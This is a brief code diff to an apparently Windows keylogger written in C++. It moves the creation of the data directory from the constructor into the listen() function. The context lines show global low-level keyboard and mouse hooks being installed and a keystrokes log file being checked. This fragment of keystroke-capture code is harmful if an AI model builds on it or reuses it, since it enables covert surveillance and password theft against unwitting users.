@@ -92,8 +92,6 @@ KeyLogger::KeyLogger() {
     
     programPath = buffer;
     programDir = removeFilespec(programPath);
-
-    CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
     
     activeWindowTitle = getActiveWindowTitle();
 
@@ -267,6 +265,8 @@ void KeyLogger::listen() {
     khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
     mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
     
+    CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
+
     ifstream logCheck(programDir + DATADIR + "\\" + KEYSTROKES_FILE);
     bool exists = logCheck.good();
     logCheck.close();
